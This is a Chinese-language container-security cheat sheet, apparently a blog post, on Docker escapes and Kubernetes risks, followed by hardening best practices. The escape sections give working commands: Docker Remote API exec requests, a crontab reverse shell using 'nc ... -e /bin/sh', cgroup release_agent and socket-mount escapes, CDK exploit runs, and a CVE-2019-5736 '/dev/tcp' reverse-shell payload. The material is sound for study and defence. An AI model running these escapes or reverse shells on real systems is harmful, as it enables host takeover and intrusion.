---
title: 云原生安全初认识之容器安全 Cheat Sheet
date: February 26th 2021
tags: [云原生, 容器安全, Docker, Kubernetes]
summary: 云原生安全入门之容器安全速查手册，涵盖 Docker 容器逃逸、Kubernetes 安全配置、镜像安全等云原生环境下的攻防要点。
---

# 云原生安全初认识之容器安全 Cheat Sheet

## 云原生安全

### 什么是云原生安全

云原生（Cloud Native）是一套技术体系和方法论，它由2个词组成，云（Cloud）和原生（Native）。云（Cloud）表示应用程序位于云中，而不是传统的数据中心；原生（Native）表示应用程序从设计之初即考虑到云的环境，原生为云而设计，在云上以最佳状态运行，充分利用和发挥云平台的弹性和分布式优势。

云原生的代表技术包括容器、服务网格（Service Mesh）、微服务（Microservice）、不可变基础设施和声明式API。

![](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/02/26/16135516731820.jpg)

### 云原生安全的4个C

你可以分层去考虑安全性，云原生安全的 4 个 C 分别是云（Cloud）、集群（Cluster）、容器（Container）和代码（Code）。

![](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/02/26/16135515597056.jpg)

云原生安全模型的每一层都是基于下一个最外层，代码层受益于强大的基础安全层（云、集群、容器）。你无法通过在代码层解决安全问题来为基础层中糟糕的安全标准提供保护。

### 按不同视角进行的安全划分

#### 构建-部署-运行

- 构建时安全(Build)
  - 以规则引擎的形式运营监管容器镜像
    - Dockerfile
    - 可疑文件
    - 敏感权限
    - 敏感端口
    - 基础软件漏洞
    - 业务软件
- 部署时安全(Deployment)
  - Kubernetes
- 运行时安全(Runtime)
  - HIDS

#### 攻击前后

- 攻击前：裁剪攻击面，减少对外暴露的攻击面（本文涉及的场景关键词：隔离）；
- 攻击时：降低攻击成功率（本文涉及的场景关键词：加固）；
- 攻击后：减少攻击成功后攻击者所能获取的有价值的信息、数据以及增加留后门的难度等。

#### 容器攻击面

- Linux内核漏洞
  - 内核提权
  - 容器逃逸
- 容器自身
  - CVE-2019-5736：runc - container breakout vulnerability
- 不安全部署(配置)
  - 特权容器或者以root权限运行容器；
  - 不合理的Capability配置（权限过大的Capability）。

## 容器本身的信息收集

### 判断当前机器是否为Docker容器环境

- 检查PID的进程名

如果该进程就是应用进程则判断是容器，而如果是 init 进程或者 systemd 进程，则不一定是容器，当然不能排除是容器的情况，比如 LXD 实例的进程就为/sbin/init。

```bash
ps -p1
```

- 检查内核文件

容器和虚拟机不一样的是，容器和宿主机是共享内核的，因此理论上容器内部是没有内核文件的，除非挂载了宿主机的/boot目录。

```bash
KERNEL_PATH=$(cat /proc/cmdline | tr ' ' '\n' | awk -F '=' '/BOOT_IMAGE/{print $2}')
test -e $KERNEL_PATH && echo "Not Sure" || echo "Container"
```

- 检查 /proc/1/cgroup 是否存在含有docker字符串，并且这条命令可以获取到docker容器的uuid。

```bash
cat /proc/1/cgroup

cat /proc/1/cgroup | grep -qi docker && echo "Docker" || echo "Not Docker"
```

- 检查根目录是否存在.dockerenv文件

容器是通过 cgroup 实现资源限制，每个容器都会放到一个 cgroup 组中，如果是 Docker，则 cgroup 的名称为`docker-xxxx`，其中xxxx为 Docker 容器的 UUID。而控制容器的资源，本质就是控制运行在容器内部的进程资源，因此我们可以通过查看容器内部进程为 1 的 cgroup 名称获取线索。

```bash
ls -la /.dockerenv

[[ -f /.dockerenv ]] && echo "Docker" || echo "Not Docker"
```

- 其他方式

```plain
sudo readlink /proc/1/exe
// 如果返回system字样则为宿主机

systemd-detect-virt -c
// 返回none则为宿主机
```

## 容器逃逸

- 用户层
  - 用户配置不当
  - 危险挂载
- 服务层: 容器服务自身缺陷(程序漏洞)
- 系统层: Linux内核漏洞

### 配置不当导致Docker逃逸

#### Docker Remote API 未授权访问

**docker swarm**

```plain
docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供
```

docker swarm是管理docker集群的工具。主从管理、默认通过2375端口通信。绑定了一个Docker Remote API的服务，可以通过HTTP、Python、调用API来操作Docker。

**漏洞环境搭建**

使用vulhub搭建漏洞环境：[docker daemon api 未授权访问漏洞](https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md)

**漏洞利用一 容器RCE**

- 获取主机上所有容器：

```bash
curl -i -s -X GET http://<docker_host>:PORT/containers/json
```

- 创建一个将在容器上执行的”exec”实例

```plain
POST /containers/<container_id>/exec HTTP/1.1
Host: <docker_host>:PORT
Content-Type: application/json
Content-Length: 188

{
  "AttachStdin": true,
  "AttachStdout": true,
  "AttachStderr": true,
  "Cmd": ["cat", "/etc/passwd"],
  "DetachKeys": "ctrl-p,ctrl-q",
  "Privileged": true,
  "Tty": true
}
```

bash 命令

```bash
curl -i -s -X POST \
-H "Content-Type: application/json" \
--data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' \
http://<docker_host>:PORT/containers/<container_id>/exec
```

- 启动exec实例

```plain
POST /exec/<exec_id>/start HTTP/1.1
Host: <docker_host>:PORT
Content-Type: application/json

{
 "Detach": false,
 "Tty": false
}
```

bash命令

```bash
curl -i -s -X POST \
-H 'Content-Type: application/json' \
--data-binary '{"Detach": false,"Tty": false}' \
http://<docker_host>:PORT/exec/<exec_id>/start
```

**漏洞利用二 宿主机RCE**

利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。

```python
import docker

client = docker.DockerClient(base_url='http://your-ip:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```

**使用cdk进行漏洞利用**

使用cdk直接执行命令：

```bash
./cdk run docker-api-pwn http://127.0.0.1:2375 "touch /host/tmp/docker-api-pwn"
```

挂在宿主机根目录/到容器内部/host，然后执行用户输入的指令来篡改宿主机的文件，比如可以写/etc/crontab来搞定宿主机。

参考：[Exploit: docker api pwn](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-api-pwn)

#### Docker 高危启动参数 –privileged 特权模式启动容器

**原因**

```plain
当操作者执行docker run --privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。
```

**环境搭建**

```plain
sudo docker run -itd --privileged ubuntu:latest /bin/bash
```

**漏洞利用**

```plain
查看磁盘文件: fdisk -l
新建目录以备挂载: mkdir /aa
将宿主机/dev/sda1目录挂载至容器内 /aa: mount /dev/sda1 /aa
即可写文件获取权限或数据
```

使用cdk：

```bash
./cdk run mount-disk
```

#### Docker 高危启动参数 –cap-add=SYS_ADMIN 利用

Docker 通过Linux namespace实现6项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限。

```plain
--cap-add=SYS_ADMIN  启动时，允许执行mount特权操作，需获得资源挂载进行利用。
--net=host           启动时，绕过Network Namespace
--pid=host              启动时，绕过PID Namespace
--ipc=host              启动时，绕过IPC Namespace
```

前提：

```plain
在容器内root用户
容器必须使用SYS_ADMIN Linux capability运行
容器必须缺少AppArmor配置文件，否则将允许mount syscall
cgroup v1虚拟文件系统必须以读写方式安装在容器内部
```

我们需要一个cgroup，可以在其中写入notify_on_release文件(for enable cgroup notifications)，挂载cgroup控制器并创建子cgroup，创建/bin/sh进程并将其PID写入cgroup.procs文件，sh退出后执行release_agent文件。

```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "ls > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

查看导出的文件

```bash
ls /tmp/cgrp
cat /output
```

### 危险挂载导致Docker逃逸

挂载目录（-v /:/soft）

```bash
docker run -itd -v /dir:/dir ubuntu:18.04 /bin/bash
```

#### 挂载 Docker Socket

**逃逸复现**

- 首先创建一个容器并挂载/var/run/docker.sock

```bash
docker run -itd -v /var/run/docker.sock:/var/run/docker.sock ubuntu
```

- 在该容器内安装Docker命令行客户端

```bash
apt-update
apt-get install \
apt-transport-https \
ca-certificates \
curl \
gnupg-agent \
software-properties-common
curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | apt-key add -
apt-key fingerprint 0EBFCD88
add-apt-repository \
"deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \
$(lsb_release -cs) \
stable"
apt-get update
apt-get install docker-ce docker-ce-cli containerd.io
```

- 接着使用该客户端通过Docker Socket与Docker守护进程通信，发送命令创建并运行一个新的容器，将宿主机的根目录挂载到新创建的容器内部

```bash
docker run -it -v /:/host ubuntu:18.04 /bin/bash
```

- 在新容器内执行chroot将根目录切换到挂载的宿主机根目录。

```bash
chroot /test
```

使用cdk工具执行命令：

```bash
./cdk run docker-sock-pwn /var/run/docker.sock "touch /host/tmp/pwn-success"
```

#### 挂载 procfs 目录

关于procfs

```plain
procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时
```

漏洞利用过程比较复杂，但是可以通过cdk快速利用。example:

1. 宿主机启动测试容器，挂载宿主机的procfs，尝试逃逸当前容器。docker run -v /root/cdk:/cdk -v /proc:/mnt/host_proc –rm -it ubuntu bash
2. 容器内部执行 ./cdk run mount-procfs /mnt/host_proc “touch /tmp/exp-success”
3. 宿主机中出现/tmp/exp-success文件，说明exp已经成功执行，攻击者可以在宿主机执行任意命令。

参考：[Exploit: mount procfs](https://github.com/cdk-team/CDK/wiki/Exploit:-mount-procfs)

#### 挂载 cgroup 目录

使用cdk进行利用

```bash
./cdk run mount-cgroup "<shell-cmd>"
```

### 程序漏洞导致Docker逃逸

#### CVE-2019-5736 runc容器逃逸漏洞

**漏洞详情**

Docker、containerd或者其他基于runc的容器运行时存在安全漏洞，攻击者通过特定的容器镜像或者exec操作可以获取到宿主机的runc执行时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限。

**影响范围**

Docker版本 < 18.09.2  
runc版本 <= 1.0-rc6。

**利用步骤**

使用POC：

POC: [CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)

- 修改payload

```plain
vi main.go
payload = "#!/bin/bash \n bash -i >& /dev/tcp/192.168.172.136/1234 0>&1"
```

- 编译

```bash
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
```

- 拷贝到docker容器中执行
- 等待受害者使用docker exec连接容器
- 收到反弹shell

#### CVE-2019-14271 Docker cp 命令容器逃逸攻击漏洞

**漏洞详情**

当Docker宿主机使用cp命令时，会调用辅助进程docker-tar，该进程没有被容器化，且会在运行时动态加载一些libnss.so库。黑客可以通过在容器中替换libnss.so等库，将代码注入到docker-tar中。当Docker用户尝试从容器中拷贝文件时将会执行恶意代码，成功实现Docker逃逸，获得宿主机root权限。

**影响范围**

Docker 19.03.0

**漏洞参考**

[Docker Patched the Most Severe Copy Vulnerability to Date With CVE-2019-14271](https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/)

#### CVE-2019-13139 Docker build code execution

**漏洞参考**

[CVE-2019-13139 - Docker build code execution](https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/)

### 内核漏洞导致Docker 逃逸

#### DirtyCow(CVE-2016-5195)脏牛漏洞实现Docker 逃逸

**漏洞描述**

```plain
Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，通过它可实现Docker容器逃逸，获得root权限的shell。
```

Docker 与 宿主机共享内核，因此容器需要在存在dirtyCow漏洞的宿主机里。

**漏洞复现**

环境获取：git clone [https://github.com/gebl/dirtycow-docker-vdso.git](https://github.com/gebl/dirtycow-docker-vdso.git)

### 工具使用 CDK

CDK：[https://github.com/cdk-team/CDK](https://github.com/cdk-team/CDK)

复制到container内

```bash
# 宿主机
docker cp /Users/threezh1/Downloads/cdk_linux_amd64 e39eb7abd9e6:/root

# Container
cd /root
mv cdk_linux_amd64 cdk
chmod 777 cdk
```

常用命令

```bash
# 信息收集
cdk evaluate

# 列举全部exp
cdk run --list

# 执行指定的exp
cdk run <script-name> [options]
```

## k8s的安全问题

通过cdk的evaluate的检测项，可以看一下k8s的安全问题。

### k8s搭建踩坑

参考：

- https://learnku.com/articles/42843
- https://raw.githubusercontent.com/kubernetes/dashboard/v1.10.1/src/deploy/recommended/kubernetes-dashboard.yaml
- https://github.com/kubernetes/dashboard

1. 先通过docker-desktop安装k8s，参考：https://github.com/maguowei/k8s-docker-desktop-for-mac
2. 安装k8s kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.2.0/aio/deploy/recommended.yaml
3. 开启本地代理 kubectl proxy
4. 访问 http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
5. 下方步骤获取token
6. 安装helm
  1. brew install helm
  2. helm repo add stable http://mirror.azure.cn/kubernetes/charts/
  3. helm repo update
  4. helm install my-mysql stable/mysql

创建一个用户：

```plain
kubectl apply -f dashboard-adminuser.yaml
```

dashboard-adminuser.yaml 内容如下：

```plain
apiVersion: v1
kind: ServiceAccount
metadata:
  name: admin-user
  namespace: kube-system
```

获取token

```plain
kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk '{print $1}')
```

### kube-proxy边界绕过(CVE-2020-8558)

> 攻击者可能通过同一局域网下的容器，或在集群节点上访问同一个二层域下的相邻节点上绑定监听了本地127.0.0.1端口的TCP/UDP服务，从而获取接口信息。

详细介绍可以参考：[CVE-2020-8558：Kubernetes 本地主机边界绕过漏洞通告](https://www.anquanke.com/post/id/210338)

列出可能受影响的服务：

```plain
lsof +c 15 -P -n -i4TCP@127.0.0.1 -sTCP:LISTEN
lsof +c 15 -P -n -i4UDP@127.0.0.1
```

### K8s Api-server

> 检查ENV信息判断当前容器是否属于K8s Pod，获取K8s api-server连接地址并尝试匿名登录，如果成功意味着可以直接通过api-server接管K8s集群。

参考：[https://github.com/cdk-team/CDK/wiki/Evaluate:-K8s-API-Server](https://github.com/cdk-team/CDK/wiki/Evaluate:-K8s-API-Server)

前提是必须k8s支持匿名登录，默认是不支持匿名登录的。如果存在这个问题，可以用`cdk kcurl anonymous`去发起HTTP请求。

### K8s Service Account

> K8s集群创建的Pod中，容器内部默认携带K8s Service Account的认证凭据(/run/secrets/kubernetes.io/serviceaccount/token)，CDK将利用该凭据尝试认证K8s api-server服务器并访问高权限接口，如果执行成功意味着该账号拥有高权限，您可以直接利用Service Account管理K8s集群。

测试如下：

![-w869](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/02/26/16143126701679.jpg)

**通过cdk连接K8s api-server发起自定义HTTP请求：**

先通过`cdk evaluate`判断是否存在这个问题

![-w829](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/02/26/16143137745665.jpg)

再获取k8s的api-server地址：

![-w526](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/02/26/16143142284777.jpg)

然后通过`cdk kcurl`进行请求

![-w866](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/02/26/16143142643198.jpg)

之后使用CDK可以部署后门Pod和影子k8s api-server。

## 容器安全最佳实践

这部分翻译自网络，后期整理。

- Container

1. 始终使用最新版本的Docker
2. 仅允许受信任的用户控制Docker守护程序
3. 确保有适当的规则，可以提供以下方面的审查
  1. Docker守护程序
  2. Docker文件和目录
    1. /var/lib/docker
    2. /etc/docker
    3. Docker.service
    4. Docker.socket
    5. /etc/default/docker
    6. /etc/docker/daemon.json
    7. /etc/sysconfig/docker
    8. /usr/bin/containerd
    9. /usr/sbin/runc
4. 确保所有Docker文件和目录归适当的用户（通常是root用户）所有，并将其文件权限设置为限制性值，以保护所有Docker文件和目录
5. 使用具有有效注册表证书的注册表或使用TLS的注册表，以最大程度地减少流量拦截的风险。
6. 如果您使用的容器中没有在映像中定义显式容器用户，则应启用用户名称空间支持，这将允许您将容器用户重新映射为主机用户。
7. 禁止容器获取新特权。默认情况下，允许容器获取新特权，因此必须显式设置此配置。您可以采取的最小化特权升级攻击的另一步骤是删除映像中的setuid和setgid权限。
8. 以非root用户（UID不为0）运行容器。默认情况下，容器以root用户身份以容器内的root用户身份运行。
9. 构建容器时，请仅使用受信任的基本映像。
10. 使用不包含可能导致更大攻击面的不必要软件包的最小基础映像。
11. 实施强有力的治理策略，以强制进行频繁的图像扫描。
12. 构建一个工作流，该工作流定期标识并从主机中删除陈旧或未使用的图像和容器。
13. 不要将机密存储在映像/ Dockerfile中。默认情况下，允许您将机密存储在Dockerfile中，但是将机密存储在映像中将使该映像的任何用户都可以访问该机密。
14. 运行容器时，请删除容器按需运行所需的所有功能。
15. 不要使用–privileged标志运行容器，因为这种类型的容器将具有底层主机可用的大多数功能。该标志还将覆盖您使用CAP DROP或CAP ADD设置的所有规则。(添加–no-new-privileges标志，始终使用来运行docker映像，–security-opt=no-new-privileges以防止使用setuid或setgid二进制文件升级特权。)
16. 不要在容器上挂载敏感的主机系统目录，尤其是在可写模式下，这可能会使它们暴露于恶意更改之下，从而导致主机受损。
17. 不要在容器中运行sshd。默认情况下，ssh守护程序将不会在容器中运行，并且您不应该安装ssh守护程序来简化SSH服务器的安全性管理
18. 不要在容器内映射1024以下的任何端口，因为它们会传输敏感数据，因此会被视为特权端口。默认情况下，Docker会将容器端口映射到49153-65525范围内的端口，但它允许将容器映射到特权端口。根据一般经验，请确保仅在容器上打开需要的端口。
19. 除非必要，否则不要共享主机的网络名称空间，进程名称空间，IPC名称空间，用户名称空间或UTS名称空间，以确保Docker容器与基础主机之间的正确隔离。
20. 指定容器按设计运行所需的内存和CPU数量，而不是依赖于任意数量。默认情况下，Docker容器无限制地平均共享其资源。
21. 将容器的根文件系统设置为只读。一旦运行，容器就不需要更改根文件系统。对根文件系统进行的任何更改都可能出于恶意目的。为了保留容器的不变性-不修补新容器而是从新映像重新创建容器-您不应使根文件系统可写。
22. 施加PID限制。容器的优点之一是严格的过程标识符（PID）控制。内核中的每个进程都承载唯一的PID，容器利用Linux PID名称空间为每个容器提供PID层次结构的单独视图。对PID设置限制可有效限制每个容器中运行的进程数。限制容器中的进程数可以防止新进程的大量产生以及潜在的恶意横向移动。施加PID限制还可以防止叉子炸弹（不断自我复制的过程）和异常过程。通常，这样做的好处是，如果您的服务始终运行特定数量的进程，那么将PID限制设置为确切的数量可以缓解许多恶意行为，包括反向Shell和远程代码注入–实际上，
23. 不要将您的挂载传播规则配置为共享。共享挂载传播意味着对挂载所做的任何更改都将传播到该挂载的所有实例。而是将挂载传播设置为从属模式或私有模式，以便对卷进行的必要更改不会与不需要该更改的容器共享（或传播到该容器）。
24. 不要将docker exec命令与privated或user = root选项一起使用，因为此设置可以使容器具有扩展的Linux功能
25. 不要使用默认网桥“ docker0”。使用默认网桥可以让您轻松应对ARP欺骗和MAC泛洪攻击。相反，容器应位于用户定义的网络上，而不是默认的“ docker0”网桥。
26. 不要将Docker套接字安装在容器内，因为这种方法将允许容器内的进程执行命令，使其完全控制主机。
27. 规则5-禁止容器间通讯（–icc = false）
28. 使用Linux安全模块（seccomp，AppArmor或SELinux）
29. 规则7-限制资源（内存，CPU，文件描述符，进程，重新启动）
30. 规则＃8-将文件系统和卷设置为只读
31. 规则10-将日志记录级别至少设置为INFO¶

- Kubernetes安全最佳实践

1. 对于RBAC，请为特定用户或用户组指定您的Roles和ClusterRoles，而不是向任何用户或用户组授予cluster-admin特权。
2. 使用Kubernetes RBAC时避免重复权限，因为这样做可能会导致操作问题。
3. 删除未使用或不活动的RBAC角色，以便在对故障进行故障排除或调查安全事件时将注意力集中在活动的角色上。
4. 使用Kubernetes网络策略隔离您的Pod，并明确允许应用程序正常运行所需的通信路径。否则，您将同时遭受横向和南北威胁。
5. 如果您的Pod需要Internet访问（入口或出口），则创建适当的网络策略以实施正确的网络分段/防火墙规则，然后创建该网络策略所针对的标签，最后将您的Pod与该标签关联。
6. 使用PodSecurityPolicy准入控制器可以确保实施适当的管理策略。PodSecurityPolicy控制器可以阻止容器以root身份运行，或者确保容器的根文件系统以只读方式安装（这些建议听起来很耳熟，因为它们都在之前要采取的Docker措施清单中）。
7. 使用Kubernetes准入控制器来实施映像注册表管理策略，以便自动拒绝从不受信任的注册表中获取的所有映像。

- 安全问题

1. 上次扫描日期超过60天的主机上有多少张图像？
2. 多少个图像/容器具有高严重性漏洞？
3. 这些高度严重的易受攻击的容器会影响哪些部署？
4. 受影响的部署中是否有任何存储秘密的容器？
5. 是否有任何易受攻击的容器以root身份或特权标志运行？
6. Pod中是否有没有与之关联的网络策略（意味着它允许所有通信）的易受攻击的容器？
7. 生产中运行的任何容器都会受到此漏洞的影响吗？
8. 我们正在使用的图像来自哪里？
9. 我们如何阻止从不受信任的注册表中提取的图像？
10. 我们能够查看容器运行时正在执行哪些进程吗？
11. 哪些集群，名称空间和节点不符合Docker和Kubernetes的CIS基准测试？

- Dockerfile需要注意的问题

1. 确保USER已经被指定
2. 确保基本的镜像版本已经固定
3. 确保操作系统包版本已经固定
4. 避免使用ADD，尽量使用COPY
5. 避免使用apt/apk upgrade
6. 避免在RUN指令中调用curl获取bash文件

- 静态分析工具

1. https://github.com/coreos/clair
2. https://github.com/aquasecurity/trivy
3. https://snyk.io/
4. https://anchore.com/opensource/
5. https://github.com/aquasecurity/microscanner
6. https://jfrog.com/xray/
7. https://www.qualys.com/apps/container-security/
8. https://www.inspec.io/docs/reference/resources/docker/
9. https://dev-sec.io/baselines/docker/

- k8s config扫描工具

1. https://github.com/Shopify/kubeaudit
2. https://kubesec.io/
3. https://github.com/aquasecurity/kube-bench

## 参考

- 美团技术团队-云原生之容器安全实践
- 云原生安全概述-Kubernetes
- Container Security:Going Beyond Image Scanning
- Docker Container Security 101: Risks and 33 Best Practices
- Docker安全备忘单
- [https://resources.whitesourcesoftware.com/blog-whitesource/docker-container-security](Docker Container Security: Challenges and Best Practices)
- Docker逃逸小结第一版 更新
- 渗透测试之Docker逃逸
- CDK Home CN
- 【云原生攻防研究】容器逃逸技术概览
- 容器逃逸技术概览